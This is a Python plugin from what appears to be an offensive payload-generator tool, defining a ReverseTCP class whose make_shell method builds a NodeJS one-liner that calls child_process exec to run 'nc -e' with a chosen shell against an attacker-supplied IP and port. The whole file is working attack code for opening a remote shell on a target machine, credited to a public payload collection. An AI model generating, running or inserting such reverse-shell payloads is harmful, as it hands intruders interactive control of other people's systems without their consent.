from ogabog.cores import plugin, const


class ReverseTCP(plugin.ReverseShell):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--shell",
            default="bash",
            choices=const.LINUX_SHELL,
            help="Select shell type on target machine"
        )
        self.add_args(
            "--exec",
            default="exec",
            choices=[
                "exec",
                "execSync"
                # "execFile",
                # "spawn",
                # "fork"
            ]
        )
        self.opts.description = "[ReverseShell][TCP] NodeJS from swisskyrepo/PayloadsAllTheThings. License MIT."
        self.opts.description += "\nModule author: Nguyen Hoang Thanh <smith.nguyenhoangthanh@gmail.com>"
        self.protocol = "tcp"
        # self.shell_type = 0
        self.is_interactive = True

    def make_shell(self):
        self.shell = f"""node -e "require('child_process').{self.args.exec}"""
        self.shell += f"""('nc -e {self.args.shell} {self.args.ip} {self.args.port}') \""""
